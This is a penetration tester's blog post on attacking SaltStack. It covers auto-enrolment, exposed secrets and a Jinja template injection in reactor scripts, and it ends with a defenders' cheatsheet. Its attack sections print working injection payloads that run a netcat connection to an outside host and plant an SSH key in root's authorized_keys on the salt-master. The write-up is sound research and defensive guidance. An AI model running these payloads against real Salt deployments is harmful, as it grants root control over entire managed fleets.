---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-09_a-salt-attacking-saltstack.md
original_filename: 2023-02-09_a-salt-attacking-saltstack.md
title: 'A-Salt: attacking SaltStack'
category: documents
detected_topics:
- command-injection
- automation-abuse
- api-security
- supply-chain
- otp
- information-disclosure
tags:
- imported
- documents
- command-injection
- automation-abuse
- api-security
- supply-chain
- otp
- information-disclosure
language: en
raw_sha256: 01fe349a57c4a93aedb8f99bd17c751c119aed4ac5b2dfbb71443aad2c7d590d
text_sha256: 531955baa5ae8a2ab25937509135337dda957099f20eb1baad66ec7e7eb4edee
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: true
---

# A-Salt: attacking SaltStack

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-09_a-salt-attacking-saltstack.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, api-security, supply-chain, otp, information-disclosure
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: True
- Raw SHA256: `01fe349a57c4a93aedb8f99bd17c751c119aed4ac5b2dfbb71443aad2c7d590d`
- Text SHA256: `531955baa5ae8a2ab25937509135337dda957099f20eb1baad66ec7e7eb4edee`


## Content

---
title: "A-Salt: attacking SaltStack"
page_title: "Skylight Cyber | A-Salt: attacking SaltStack"
url: "https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/"
final_url: "https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/"
authors: ["Alex Hill"]
bugs: ["SSTI", "Security misconfiguration", "Information disclosure", "RCE"]
publication_date: "2023-02-09"
added_date: "2023-02-16"
source: "pentester.land/writeups.json"
original_index: 1553
---

[![](/images/logo.svg)](/)

[Home](/)

[About](/about-us/ "About")

[Services](/services/ "Services")

[Blog](/blog/ "Blog")

[Careers](/careers/ "Careers")

[Contact Us](/contact-us/ "Contact Us")

# A-Salt: attacking SaltStack

9 February 2023

![clock-image](/images/clock-eight.svg)

20

minute read

![author photo](/images/team/AlexHill.jpg)

by

Alex Hill

# TL;DR

SaltStack is an IT orchestration platform, similar to Puppet or Ansible. This blog post introduces a set of common misconfigurations we’ve encountered in the wild, as well as a novel template injection technique that can achieve remote code execution on a `salt-master` (or master-of-masters) server. With a bit of luck, you can go from a basic presence in a network, to the keys to the kingdom, and potentially neighbouring kingdoms as well.

This post is for attackers but I’ve included a cheatsheet summary for defenders too.

# What is Salt? What am I looking at?

If this is your first time reading about [Salt (aka SaltStack)](https://docs.saltproject.io/), it is a relatively new entrant to the IT orchestration field, alongside the likes of Ansible and Puppet. And because of that relative youth there is not very much in the security space written up on it. This post was written with the aim of helping anyone who is on a pentest/red team and finds themselves in a network running Salt as well as those tasked with securing Salt.

With that in mind, here is a basic primer:

  1. Salt at its core is for automated infrastructure management focused around applying and maintaining states on devices. If the active state is misaligned to the configured state, it tries to fix it by reapplying whatever configuration the human IT administrator defined. This could be as simple as pushing up-to-date config files or as complex as triggering a build pipeline to ultimately bring up fresh containers across a fleet. It can be made to do basically anything by deploying custom scripts.

  2. It is dependent on a software agent being installed and enrolled on devices to be managed. In Salt-speak these agents are ‘minions’ and they are slaved to one or more central ‘master’ controllers. The master device should be your target because it is a backdoor-as-a-feature to all minions under it. The master is almost certainly going to be a *nix box.

Minions are pretty easy to spot once you are a host by checking any of the following:
  
  systemctl status salt-minion
  ps -aux | grep minion
  ls /etc/salt/minion.d/
  ls /opt/saltstack/

You can spot a master server by:

  * Checking a minion’s /etc/salt/minion.d/master.conf file;
  * Checking a minion’s inbound/outbound connections on TCP/4505 and TCP/4506; or
  * Confirming a server has TCP/4505 and TCP/4506 open.
  * Reminder - in large networks, different minions may be enrolled to different masters.
  3. With Salt you are entering a world of Python and YAML so everything is a local file and can be read and edited from disk.

# The Target

Most of this research came out of a recent engagement for a company that makes niche software products for power grid site engineers/operators. I’m going to call them PowerCorp. These products are sold to various businesses involved in the electricity generation, transmission, and storage lifecycle and, as one might imagine for such niche software, was heavily customised for every customer. Most of PowerCorp’s customers also had some form of customised on-prem infrastructure to support the whole thing (data syncs for field devices, analytics, office connectivity, VPNs). This stuff was all designed to operate within the customer’s internal ecosystem and should never be shared between customers (competitors).

  
[![Logical PowerCorp network architecture](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_1.png)](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_1.png) Logical PowerCorp network architecture

I was given one of PowerCorp’s standard build field laptops (e.g. for an engineer travelling around) and tasked with getting up to no good. The main objective was to see how much damage a standard engineer’s laptop could do to that customer’s deployment since bringing down any of it could mean a massive loss of productivity and have potential safety implications. As you will see however, we went bigger and ultimately pivoted cross-customer as well.

From the perspective of the laptop, a big part of the available attack surface inside a PowerCorp customer network was its Salt ecosystem which ultimately provided connectivity back into PowerCorp’s central management zone.

Having two layers of salt-masters like this where there is a top level master-of-masters is something Salt supports out of the box. The intermediary salt-master nodes (the customer site nodes) are called syndic nodes and they work just how you would expect - they are both a master to the minions below them and in turn are a minion themselves to the top level master server. This type of architecture was useful for PowerCorp to provide automation and serve necessary Salt functionality locally to a site even if links back to the PowerCorp network were not available.

# Common (non-CVE) issues to look out for

With PowerCorp in the background, I’ve got four and a half things anyone testing Salt security should have in their arsenal. The first three are dead simple misconfigurations, but can prove very effective in taking down an environment. The last one and a half are much tastier and are where we achieved command execution across our target environment.

Check these first, you might get pretty far without needing to do much work:

  1. Automatic minion enrolment
  2. Secrets storage in files rather than Salt’s pillar system
  3. Exposure of sensitive/unintended files, including Salt’s pillar system

Then move on to this:

  4. Jinja template injections  
4.5. Trusting minions too much

# Issue 1 - Automatic minion enrolment

**TL;DR**  
Always check if you can enrol your own rogue minion, it will make your life easier.

* * *

A big part of the Salt model that may make attacking it difficult is that minions must be enrolled to gain access to any meaningful attack surface. Enrolment is supposed to be dependent on a human explicitly accepting the public key presented by each minion when it first comes on the network and reports in to its master.

From a salt-master you would list minion keys awaiting acceptance:  

  
  
  salt-key -L

And permit them if you recognise them:  

  
  
  salt-key -a webserver07

If you do not recognise or generally trust a device, you should not accept it. It might not seem obvious why accepting a rogue device into your Salt environment could really be that bad though - what’s the worst it could do if it lets us manage it? Well read on and you will get some ideas but the unsatisfying answer is that ~it depends~. It depends on how hardened the Salt environment is and what sorts of things the Salt state configurations are being used for.

On a related tangent, I have issues with the official Salt documentation and its lack of security guidance. Auto enrolment is a good example of this. In the same guide it points out that you can configure automatic key acceptance, and even offers an approach to doing so, but then also includes one of its very few [warnings](https://docs.saltproject.io/salt/install-guide/en/latest/topics/accept-keys.html#accept-keys) against doing this (it describes it as ‘very dangerous’ :|). At no point though does it explain why. With this kind of mixed messaging, it is understandable that an IT admin might ignore it for the sake of getting things done.

For example, if you are the PowerCorp’s IT admin, you want the provisioning of new customer infrastructure (laptops for engineers, servers for new sites) to be as automated and streamlined as possible. They had scripts that would install and configure salt-minions and then, once enrolled, Salt states would be triggered and the rest of the device was built from centrally managed state files. It was a pretty good workflow. One that was broken if the human needs to do the pesky manual key acceptance process above for each and every device. If you check the official [Salt documentation](https://docs.saltproject.io/en/latest/topics/reactor/#a-complete-example) again, you can see where the PowerCorp admin got the idea for their particular auto enrolment script too.

Example definition from official Salt documentation:  

  
  
  /srv/reactor/auth-pending.sls
  {% if 'act' in data and data['act'] == 'pend' and data['id'].startswith('ink') %}
  minion_add:
  wheel.key.accept:
  - args:
  - match: {{ data['id'] }}
  {% endif %}

Here’s what I found in the PowerCorp environment:  

  
  
  /srv/reactor/autoaccept.sls
  {% if 'act' in data and data['act'] == 'pend' or data['act'] == 'denied' %}
  minion_add:
  wheel.key.accept:
  - match: {{ data['id'] }}
  - include_denied: True
  {% endif %}

What is most impressive is the commitment to explicitly include ‘denied’ minions too. With this autoaccept.sls in place, all minions that request access (i.e. in the ‘pend’ state, pending for the human to accept them) are automatically permitted, as are any that the human might explicitly have denied in the past.

## Why do we as attackers care?

Manipulating a minion and interacting with a master server is usually not something a low powered user can do. Our engineering account certainly couldn’t. Automatic enrolment allows us to bypass this requirement by spinning up our own VM, installing salt-minion, and directing it to our target salt-master. Having root access to a minion makes abusing it significantly easier, in particular when exploring template injections (see Issue 4) but also for issuing in-built commands and being able to read local files.

Another way to think about this is that auto enrolment means any endpoint controls can be bypassed/ignored. If you are relying on a managed endpoint not getting up to no good (e.g. abusing tools like `salt-call event.send` to send malicious input to your salt-master, keep reading) because the user does not have privileged access to that device, you are going to have a bad time.

On the PowerCorp laptop this was a simple matter of setting up some port forwarding to let our rogue VM talk to the master and we were away.

  
[![Rogue minion on the network; what could go wrong?](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_2.png)](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_2.png) Rogue minion on the network; what could go wrong?

# Issue 2 - Secrets stored in files

**TL;DR**  
It is pretty easy to accidentally expose secrets to all minions; it is easy to check and, depending on the secret, could get you pretty far.

* * *

Let’s look at a minimal, but quite typical, salt-master configuration. You will see a master.conf and a top.sls (.sls is just the **S** a**L** t **S** tate; its all YAML) that look like this.

/etc/salt/master.d/master.conf:  

  
  
  file_roots: # File system location definition
  base: # Environment
  - /srv/salt # Directory to look for files in
  prod: # Another environment
  - /srv/salt/prod/ # More specific files

/srv/salt/top.sls:  

  
  
  base: # Environment defined above in master.conf
  '*': # Target all minion targets
  - core # File to run
  - default_user
  
  prod: # Another environment
  'web*': # Target all minions whose names start web
  - core
  - web_user # File will be web_user.sls; see next snippet

Finally you will have the individual state files that contain the actual logic to apply, e.g. web_user in the above definition points to /srv/salt/prod/web_user.sls:  

  
  
  add_web_user: # Human friendly name
  user.present: # In-built action/function
  - name: web_user # Arguments
  - shell: /bin/sh
  - home: /home/default_user
  - uid: 5000
  - gid: 2000
  - password=***REDACTED***
  - require: ...

The password here is sitting in cleartext on the salt-master in `web_user.sls`. Secrets of any kind should never be included in state files like this specifically because **everything in the file_roots defined above, which includes ALL state files (.sls) intended for ~some~ minion, are accessible to ~ALL~ minions. This includes minions that are not the target of those state files.**

This is because of how the salt system works - without going into detail, minions are expected to be able to pull down any required files from the file_roots directories whenever the minion decides it needs them to satisfy the state it is trying to achieve.

In practice this is what this looks like from a minion:  

  
[![List and pull down file_roots files](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/salt_get_master_files.png)](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/salt_get_master_files.png) List and pull down file_roots files

## Why do we as attackers care?

Any .sls files that insecurely include secrets are open season. In a sufficiently large environment, someone is likely to let something slip through. PowerCorp had 120+ distinct .sls files over multiple environments built by different teams. Teams were each responsible for different product components and salt-ifying their deployment. Several teams were guilty of storing secrets in normal .sls files that were fully exposed to all minions - I suspect because they were given a template to work from and were not actually the people administering Salt.

Secret types I found included:

  * Cleartext passwords for various local accounts
  * API keys
  * Private SSH keys
  * FTP credentials for upstream artifact storage
  * Logic showing how various systems were configured, including the master itself (this will be important later)

This is a good example of why ~it depends~ how risky setting up minion auto enrolment and letting a rogue minion into a Salt environment is. In theory this should never happen but in practice it is very easy - there is no secrets masking or detection when this kind of mistake happens.

  
[![Gained some access with compromised credentials](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_3.png)](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_3.png) Gained some access with compromised credentials

# Issue 3 - Exposure of the pillar system’s secrets files

**TL;DR**  
**Q** \- What’s worse than including your secrets in cleartext files exposed to all minions?  
**A** \- Putting in the effort to learn and reference the secrets storage system correctly, only to then expose the secrets’ directory anyway.

* * *

So how should Salt admins be handling secrets? Those passwords need to go somewhere after all. To translate some Salt parlance, the Pillar system, or just ‘pillar’, is what you are supposed to use for this exact situation - it is the salt-master’s secrets storage system. The [official documentation](https://docs.saltproject.io/en/latest/topics/tutorials/pillar.html) tells us it should be used for, amongst other things, ‘Highly Sensitive Data’.

If we expand upon the previous configuration in issue 2, this is what should be happening.  
/etc/salt/master.d/master.conf  

  
  
  file_roots: # File system location definition
  base: # Environment
  - /srv/salt # Directory to look for files in
  prod: # Another environment
  - /srv/salt/prod/ # More specific files
  
  pillar_roots: # Secrets storage location definition
  base: # Environment
  - /srv/pillar # Secrets live here in files
  prod: # Another environment
  - /srv/pillar/prod # More specific secrets

/srv/salt/top.sls remains unchanged:  

  
  
  base: # Environment defined above in master.conf
  '*': # Target all minion targets
  - core # File to run
  - default_user
  
  prod: # Another environment
  'web*': # Target all minions whose names start web
  - core
  - web_user # File will be web_user.sls; see next snippet

Now we see the pillar system in action, the password is safely referencing the secrets storage and /salt/srv/prod/web_user.sls is fine to be exposed to minions:  

  
  
  add_web_user: # Human friendly name
  user.present: # Inbuilt action/function
  - name: {{ pillar['web_user']['username'] }} # Arguments
  - shell: /bin/sh
  - home: {{ pillar['web_user']['home_dir'] }}
  - uid: {{ pillar['web_user']['uid'] }}
  - gid: {{ pillar['web_user']['gid'] }}
  - password=***REDACTED*** pillar['web_user']['passwd'] }}
  - require: ...

I am oversimplifying some of the configuration of how the pillar system would be setup but just know that when used correctly like this, the relevant minions can retrieve the secrets they need (in this case the `passwd` value) and ONLY those values. The minions are scoped to specific secrets and not others. In this way an admin can dish out secrets on an as-needed basis and, depending on the minion, have the secret dynamically change (e.g. different web servers hosting different applications might apply the same .sls state above but retrieve different `passwd` values).

So what was the issue? Well, it is certainly less likely (I hope) but also much worse if you find it. Again the master.conf should look like this:  
/etc/salt/master.d/master.conf **(Good)**  

  
  
  file_roots: # File system location definition
  base: # Environment
  - /srv/salt # Directory to look for files in
  prod: # Another environment
  - /srv/salt/prod/ # More specific files
  
  pillar_roots: # Secrets storage location definition
  base: # Environment
  - /srv/pillar # Secrets live here in files
  prod: # Another environment
  - /srv/pillar/prod # More specific secrets

But in the PowerCorp network we actually encountered this:  
/etc/salt/master.d/master.conf **(Very bad)**  

  
  
  file_roots: # File system location definition
  base: # Environment
  - /srv/salt # Directory to look for files in
  prod: # Another environment
  - /srv/salt/prod/ # More specific files
  
  pillar_roots: # Secrets storage location definition
  base: # Environment
  - /srv/salt/pillar # Secrets live here in files
  prod: # Another environment
  - /srv/salt/pillar/prod # More specific secrets

Storing the `pillar` directory inside `/srv/salt/` places it unsafely in the file_roots. Remember how all minions can see the file_roots directories? Well now all minions can read all the secrets files which ~can~ be encrypted but often are not. They certainly weren’t at PowerCorp.

You can check this easily by grepping through the naming of available files. If you get a hit you are very likely in an incorrectly configured environment that is incorrectly exposing all Salt secrets:

  
[![Copy down secrets directory \(pillar\) and look for goodies](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/issue_3.png)](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/issue_3.png) Copy down secrets directory (pillar) and look for goodies

For reasons that should be obvious, this is a pretty big no-no. In our test, this meant we had access to all the salt secrets which were very helpful for other, non-salt related, pivots through the site’s infrastructure.

  
[![So far we have access to most site infrastructure just from lame salt configuration issues](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_4.png)](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_4.png) So far we have access to most site infrastructure just from lame salt configuration issues

Alrighty, now that the quick wins are behind us, onto something more well seasoned.

# Issue 4 - Jinja template injections

**TL;DR**  
Common salt ‘reactor’ patterns are vulnerable to template injections, resulting in command execution. This means we can potentially run arbitrary code on the master, its minions, and all master-of-masters, pivoting up and cross-customers.

* * *

Another feature of salt-masters is the [reactor](https://docs.saltproject.io/en/latest/topics/reactor/index.html) system which… reacts to things. Notably, it reacts to **minion submitted events** which we can control.

Expanding on the `master.conf` definition from earlier:  
/etc/salt/master.d/master.conf  

  
  
  file_roots:
  base:
  - /srv/salt
  prod:
  - /srv/salt/prod/
  
  pillar_roots: 
  base: 
  - /srv/pillar 
  prod: 
  - /srv/pillar/prod
  
  reactor:
  - 'salt/minion/*/start':
  - /srv/salt/reactor/do_setup_checks.sls # Review these files
  - 'prod/install/product':
  - /srv/salt/prod/reactor/install.sls # Review these files

The reactor definitions specify a string that, if seen on the salt-master’s message queue, will cause the salt-master to execute some script(s). Previously we saw .sls files targeting minions but these will define logic for the master; with some limitations on what a reactor script can do.

This is a simplified version of what PowerCorp’s install.sls script did.  

  
  
  #!jinja|yaml
  {% set product = data['data']['product'] %}
  {% set minion = data['id'] %}
  Installing selected product for {{ minion }}: # Human friendly for logging
  runner.state.orchestrate:
  - args:
  - mods: orch_product_install
  - pillar:
  minion: {{ minion }}
  action: install
  type: {{ product }}

This reactor script will cause the master to fire instructions at whatever minion sent the triggering event (as tracked by `data['id']`) to run an orchestration job that installs something custom created by the Salt admin.

`data` is a JSON object this script has access to that is populated with various automatic telemetry as well as minion-submitted data. This minion data is exclusively captured in data[‘data’] (yes, the naming is odd) and can be anything. It is up to whomever configures these scripts to include what they need. It is often used as a way for a minion to pass data about itself to its master and then let the master make a custom decision/action.

* * *

I highly recommend setting up a test environment now if you haven’t already.

Before attacking a live system, you will want to test whatever reactor logic you are injecting into first - not for safety but for repeatability. Testing and exploiting this with only access to the minion will be tedious and error prone at best and sisyphean at worst. Building your own basic salt environment is simple and if your target’s reactor logic is exposed via normal `file_roots` (quite common and some documentation encourages this), you can copy it to your own master and view the message queue and logging end-to-end.

Add the following to your /etc/salt/[minion|master].conf files:  

  
  
  log_level: debug

Then restart both minion and master and `tail -f` your verbose log files at /var/log/salt/*

* * *

From a minion, this kind of reactor logic is typically triggered by some custom application or background process e.g. a Python script with a salt library, but you can just as equally trigger it manually:  

  
  
  salt-call event.send 'prod/install/product' '{"product":"mysql"}'

From the master’s logs you will see events that look like this in response to the incoming message:  

  
  
  Sending event: tag = prod/install/product; data = {'id': 'saltminion-laptop1', 'tag': 'prod/install/product', 'data': {'__pub_fun': 'event.send', '__pub_pid': 8944, '__pub_jid': '20230203035229090158', '__pub_tgt': 'salt-call', 'product': 'mysql'}, 'cmd': '_minion_event', '_stamp': '2023-02-03T03:52:29.112696'}
  ...
  Compiling reactions for tag prod/install/product
  ...
  Time (in seconds) to render '/var/cache/salt/master/files/base/install.sls' using 'jinja' renderer: 0.0016622543334960938
  Rendered data from file: /var/cache/salt/master/files/base/install.sls:
  Installing selected product for saltminion-laptop1:
  runner.state.orchestrate:
  - args:
  - mods: orch_product_install
  - pillar:
  minion: saltminion-laptop1
  action: install
  type: mysql
  
  Time (in seconds) to render '/var/cache/salt/master/files/base/install.sls' using 'yaml' renderer: 0.00040030479431152344

What did the salt-master just do? The `install.sls` file is marked as a Jinja template file and thus salt knows to render it first before actually performing its evaluation as a YAML definition - Jinja can be used in this way to dynamically render different outputs from the same base template (e.g. using if statements and loops) based on inputs provided i.e. Jinja template in, data in, YAML out.

Injecting into Jinja templates is not a new concept but most commonly has been exploited in website rendering engines. Here in the salt implementation we’re going to exploit it by injecting into the `data['data']` object. Attention needs to be paid to ensuring the whitespacing in the final rendered YAML file is correct (since YAML is whitespace sensitive).  

  
  
  salt-call event.send 'prod/install/product' '{"product":"mysql\n\nInjection time:\n  local.cmd.run:\n  - tgt: innocent-minion\n  - args:\n  - cmd: \"nc 10.0.0.53 9090\"}'

/var/log/salt/master.log  

  
  
  Sending event: tag = prod/install/product; data = {'id': 'saltminion-laptop1', 'tag': 'prod/install/product', 'data': {'__pub_fun': 'event.send', '__pub_pid': 8944, '__pub_jid': '20230203035229090158', '__pub_tgt': 'salt-call', 'product': 'mysql\n\nInjection time:\n  local.cmd.run:\n  - tgt: innocent-minion\n  - args:\n  - cmd: nc 10.0.0.53 9090', 'cmd': '_minion_event', '_stamp': '2023-02-03T03:52:29.112696'}
  ...
  Compiling reactions for tag prod/install/product
  ...
  Time (in seconds) to render '/var/cache/salt/master/files/base/install.sls' using 'jinja' renderer: 0.001498379837922215
  Rendered data from file: /var/cache/salt/master/files/base/install.sls:
  Installing selected product for saltminion-laptop1:
  runner.state.orchestrate:
  - args:
  - mods: orch_product_install
  - pillar:
  minion: saltminion-laptop1
  action: install
  type: mysql
  
  Injection time:
  local.cmd.run:
  - tgt: innocent-minion
  - args:
  - cmd: nc 10.0.0.53 9090
  
  Time (in seconds) to render '/var/cache/salt/master/files/base/install.sls' using 'yaml' renderer: 0.00040030182619290012

`local.cmd.run` is a built-in function design to issue commands to minions. It is available inside reactor scripts to trigger actions targeting a minion (local is from the perspective of the minion specified with the target `tgt` field, it is local to itself). Using the salt cli from a master node this is functionally equivalent to manually running:  

  
  
  salt innocent-minion cmd.run "nc 10.0.0.53 9090"

Basically we are tricking the salt-master into issuing instructions to another victim minion. Since the salt-minion agent that will receive our command will be running as root, you can do whatever you want to it. Any minion in the fleet enroled to this master is a valid target using this mechanism.

Minion-to-minion command execution - `Success`

  
[![We now have root on all minions in our site](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_5.png)](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_5.png) We now have root on all minions in our site

## Key Point

The root cause for this problem is that minion-submitted data is essential unsanitised user input. The reactor scripts that are vulnerable to this type of injection are vulnerable because they blindly trust minions to be supplying well formed, non-malicious inputs. If you are in charge of building salt scripts, never trust the minion - always assume they can be manipulated (or that someone will set up auto enrolment).

The correct way to stop this type of injection from happening for most environments will be to make use of input parsing clauses like `|json`, `|yaml`, `|python`. These will prevent our payloads from being interpreted as anything unexpected and breaking the intended rendering.

In short if you see a reactor script that makes use of a variable of the form:  

  
  
  set varA = data['data']['foo']
  ...
  {{ varA }}

You have found an injectable template.

If you see a reactor script that instead looks like this:  

  
  
  set varA = data['data']['blah'] | json
  ...
  {{ varA }}

You are out of luck.

* * *

In this specific engagement, we already had various secrets and other potential ways to access other minion devices in the network. But we wanted the master node too.

## Environments with a single master node

If you are testing an environment with only one master node, it should be trivial to gain command execution on it by simply changing your payload’s `tgt` field to target the master itself. This should be its hostname and will likely match what is configured in enrolled minions’ /etc/salt/minion.d/master.conf definitions.  

  
  
  salt-call event.send 'prod/install/product' '{"product":"mysql\n\nInjection time:\n  local.cmd.run:\n  - tgt: salt-master\n  - args:\n  - cmd: \"nc 10.0.0.53 9090\"}'

This works because it is extremely common for the server you install salt-master on to also have salt-minion installed and **enrolled to itself**. I am not sure why this convention exists but most guides online will instruct users to do this.

For more complete access I am a fan of adding your SSH key to the salt-master (see below) rather than fiddling around with single commands. Alternatively, you could tell the salt-master to pull down a script and execute it. Whatever floats your boat.

Minion-to-minion command execution - `Success`  
Minion-to-master command execution - `Success`

## Environments with multiple master servers

Thinking back to our PowerCorp architecture though, they have a multi-master environment (aka master-of-masters). We need to first get minion-to-syndic command execution but intermediary syndic servers are not enrolled to themselves - they are enrolled to the top level PowerCorp salt-master. This means our previous trick of `tgt` targeting the master itself won’t work.

Where previously we used the `local` system (where local was from the perspective of a target minion), now can instead use the `runner` system. Runners give access to functions designed to be run by the masters themselves (prior to returning some response to a minion). The [documentation for different reaction types](https://docs.saltproject.io/en/latest/topics/reactor/index.html#types-of-reactions) is quite detailed and helpful for working out what is possible to execute here. I recommend reading through some of it to get to grips with the notation and design intent before continuing with this on a live engagement.

Following that documentation thread, there are [A LOT](https://docs.saltproject.io/en/latest/ref/runners/all/index.html#all-salt-runners) of possible built-in modules available. You may also have access to custom modules deployed in your environment so keep an eye out for that if nothing else works. There is probably quite a lot you could do here but all I really cared about was the fastest way to command execution so I honed in on the [runner.salt](https://docs.saltproject.io/en/latest/ref/runners/all/salt.runners.salt.html#module-salt.runners.salt) module (again, yes the naming can get confusing), which gives you access to `runner.salt.cmd`.

In turn `runner.salt.cmd` gives you access to ~71 [‘execution modules’](https://docs.saltproject.io/en/latest/ref/modules/all/index.html#all-salt-modules) which vary wildly in usefulness. But if you sift through the list you’ll find there is a built-in SSH module for managing SSH properties of the master node itself. Now it is just as simple matter of adding our own key to the server and we’re in.  

  
  
  salt-call event.send 'prod/install/product' '{"product":"mysql\n\nInjection time:\n  runner.salt.cmd:\n  - args:\n  - fun: ssh.set_auth_key\n  - user: root\n  - key: AAAAB3NzaC1yc2EAAAADAQABAAABgQD0Gy7E9XSeA+eeWAH...WcUK19X3W8ovKBbTU7p8tqmIMv7qjZk=\n\"}'

Using the salt cli from a master node, this payload is functionally equivalent to manually running:  

  
  
  salt-run salt.cmd ssh.set_auth_key root AAAAB3NzaC1yc2EAAAADAQABAAABgQD0Gy7E9XSeA+eeWAH...WcUK19X3W8ovKBbTU7p8tqmIMv7qjZk=

The end result is your supplied SSH key is appended to the salt-master’s /root/.ssh/authorized_keys. Noice.

In an environment where you lack network access to SSH to your target salt-master this won’t work. This wasn’t a problem with PowerCorp so I did not investigate further but I have no doubt that with some further experimentation some of the other 70 modules in [this list](https://docs.saltproject.io/en/latest/ref/modules/all/index.html#all-salt-modules) could be used to also achieve our goal. Another option I didn’t explore was abusing these modules to access the secrets storage system (pillar) which could be an option for you.

Minion-to-minion command execution - `Success`  
Minion-to-master command execution - `Success`  
Minion-to-syndic command execution - `Success`

  
[![Mission complete](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_6.png)](https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/powercorp_network_6.png) Mission complete

From here I used the previous `local.salt.cmd` style payload to push an SSH key up to PowerCorp’s top level salt server (which works here because the top level salt-master can only be enrolled to itself) and was basically done. From this master-of-masters server we had free command execution down to any customer site and their respective minions. All in all, a pretty cool way to go from a low powered engineer’s laptop to cross-customer fleet access.

Note that the master.conf and top.sls configurations between syndic and top level master-of-masters nodes will be different. This means that at this point it is also worth checking the auto enrolment and file_roots and pillar_roots misconfigurations (issues 1, 2, 3) against the master-of-masters server as well. Similarly we needed to find a new Jinja template injection location as the master-of-master’s reactor scripts were different.

# Issue 4.5 - Bonus injection

If you are looking for injectable Jinja fields, you might encounter a reactor script that looks like this:  

  
  
  new_custom_alert:
  cmd.3rd_party_product.create_event:
  - tgt: alertminion
  - kwarg:
  description: "Custom alert from {{ data['name'] }}"
  details: This is a custom alert
  service_key: 8282...2099308
  profile: my-customer-config

Remember how salt-minion supplied information only ends up in data[‘data’]? With a `salt-call event.send` command you can normally only manipulate the `tag` string and `data['data']`. We cannot get inside of data[‘name’] to inject into the above script.  

  
  
  salt-call event.send 'custom/alert' '{"name":"injection..."}'  # This won't work

  

  
  
  Sending event: tag = custom/alert; data = {'id': 'saltminion-laptop1','tag': 'custom/alert', 'data': {'__pub_fun': 'event.send', '__pub_tgt': 'salt-call', 'name': 'injection...'}}

Our payload ends up in the wrong place: `data['data']['name']` != `data['name']`

But this is only really a limitation of the functionality exposed by `salt-call event.send`. The solution? Edit `/opt/saltstack/salt/run/salt/modules/event.py` on our rogue minion:  

  
  
  ...
  load = {
  "id": __opts__["id"],
  "tag": tag,
  "data": data,
  "tok": auth.gen_token(b"salt"),
  "cmd": "_minion_event",
  "name": "A\n\ninjection: ..." # Add the desired field here; this artificially adds data['name']
  }
  ...

Adding your payload directly like this is perfectly valid and the salt-master is okay with it. The salt-master trusts that the minion, however it arrived at the payload it sends, is doing what it is supposed to. Normally you would not need to add custom variables at the `data['var']` level but products and scripts do and there is nothing inherently stopping this except maybe convention.

While this might seem a bit theoretical and not something that people would ever actually do, the `new_custom_alert` reactor script above, used here as an example of bad unsanitised `data['foo']` logic, is a modified version of a script provided by a 3rd party’s documentation that they publish on how to integrate salt with their product. It is a real example of how there is bad information floating around on the Internet right now with no decent security guidance available.

And in case you are wondering, no you cannot inject into `data['id']` that will appear in almost every reactor script. The salt-master checks this value and will reject your message well before any Jinja rendering takes place.

# Conclusion

I had fun researching Salt and using it to pivot through our target network. Hopefully this writeup is useful for both attackers and defenders when assessing the security of a Salt environment and gets more people looking into the state of Salt’s security in existing deployments. Salt is a powerful tool but it feels like it lacks proper security guidance for the people using it or trying to harden it. It would be great to see Salt as a product do more to provide warnings when obviously insecure practices are happening.

Finally, the salt documentation. I feel it fails to really warn or explain to its users why something is dangerous or how to do it properly. It has sacrificed security for keeping things fast and quick to get started with. By way of example, the main documentation page on reactors provides no mention on how risky unsantised minion input in data[‘data’] can be or how to properly address it. In some instances it even includes insecure examples.

# Cheatsheet for Defenders

  * Don’t deploy minion auto enrolment reactor scripts.
  * Check your .sls files for secrets; all minions can read these files. Assume all minions are rogue.
  * Check your master.conf configuration and make sure your `pillar_roots` paths are not contained within any of your `file_roots` paths.
  * Never use the `data['data']['foo']` or `data['foo']` notation in a salt reactor script without an accompanying parser (e.g. `| json`).
  * Move your reactor scripts to be outside of your `file_roots` paths (e.g. `/srv/reactor/` instead of `/srv/salt/reactor/`).
  * Assume all minions are compromised and not to be trusted.

share

![](/images/skylight-logo-big.svg)

![](/images/logomark.svg)

Level 30, 201 Elizabeth St

Sydney

NSW 2000

Australia

## SKYLIGHT CYBER

[ Home ![](/images/vector_7.svg) ](/) [ About ![](/images/vector_7.svg) ](/about-us/) [ Services ![](/images/vector_7.svg) ](/services/) [ Blog ![](/images/vector_7.svg) ](/blog/) [ Careers ![](/images/vector_7.svg) ](/careers/) [ Contact Us ![](/images/vector_7.svg) ](/contact-us/)

## find us

[ ](https://twitter.com/SkylightCyber) [ ](https://www.linkedin.com/company/skylight-cyber-security/)

Copyright © 2025 Skylight Cyber All rights reserved.

[ Privacy Policy ](/privacy-policy/)
